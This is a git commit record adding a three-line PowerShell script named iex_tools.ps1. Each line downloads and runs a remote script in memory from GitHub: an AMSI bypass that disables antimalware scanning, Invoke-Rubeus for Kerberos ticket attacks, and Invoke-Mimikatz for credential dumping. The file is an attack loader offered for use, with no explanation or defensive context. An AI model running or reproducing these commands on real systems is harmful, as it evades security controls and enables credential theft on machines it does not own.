a7dc6946ff8438fd05e948f0aa79c2f608a0517f
Rob <61951374+Leo4j@users.noreply.github.com>
2022-12-31 11:39:46 +0000

    Create iex_tools.ps1

---
+++ iex_tools.ps1
@@ -0,0 +1,3 @@
+iex(new-object net.webclient).downloadstring("https://raw.githubusercontent.com/Leo4j/NET_AMSI_Bypass/main/NETAMSI.ps1")
+iex(new-object net.webclient).downloadstring("https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Rubeus.ps1")
+iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Invoke-Mimikatz.ps1')
